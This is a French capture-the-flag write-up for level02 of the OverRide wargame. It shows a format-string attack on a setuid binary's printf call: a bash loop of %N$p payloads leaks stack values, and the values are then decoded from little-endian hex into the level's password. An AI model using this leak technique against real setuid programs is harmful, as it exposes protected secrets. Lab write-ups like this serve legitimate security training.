# Level 02

```
level02@OverRide:~$ file level02
level02: setuid setgid ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0xf639d5c443e6ff1c50a0f8393461c0befc329e71, not stripped
```

Ici tous les buffers sont sécurisés, pas contre un appel à printf est mal formaté.
Nous allons donc essayer d'afficher le `.pass` qui a été open par le programme et qui est dans la stack grâce à un appel à read.

On peut donc afficher toutes les premières adresses de la stack avec le [script bash](./resources/script.sh).

On cherche `5 valeurs hexa` à la suite, car 5 * 8 octets = 40 (la taille du buffer du `.pass` sans le null byte de fin)

On peut donc les décoder de l'hexa vers l'ascii, en inversant chaque byte du little endian, puis en assemblant le tout.

```bash
$ for((i=1;i<42;++i)); do echo "$i/%$i\$p" | ./level02 | grep does; done;
1/0x7fffffffe470 does not have access!
2/(nil) does not have access!
...
22/0x756e505234376848 does not have access!
23/0x45414a3561733951 does not have access!
24/0x377a7143574e6758 does not have access!
25/0x354a35686e475873 does not have access!
26/0x48336750664b394d does not have access!
...
38/(nil) does not have access!
39/(nil) does not have access!
40/0x2900000000 does not have access!
41/0x602010 does not have access!

$ python
>>> bytes.fromhex("756e505234376848")[::-1]
b'Hh74RPnu'
>>> bytes.fromhex("45414a3561733951")[::-1]
b'Q9sa5JAE'
>>> bytes.fromhex("377a7143574e6758")[::-1]
b'XgNWCqz7'
>>> bytes.fromhex("354a35686e475873")[::-1]
b'sXGnh5J5'
>>> bytes.fromhex("48336750664b394d")[::-1]
b'M9KfPg3H'
```
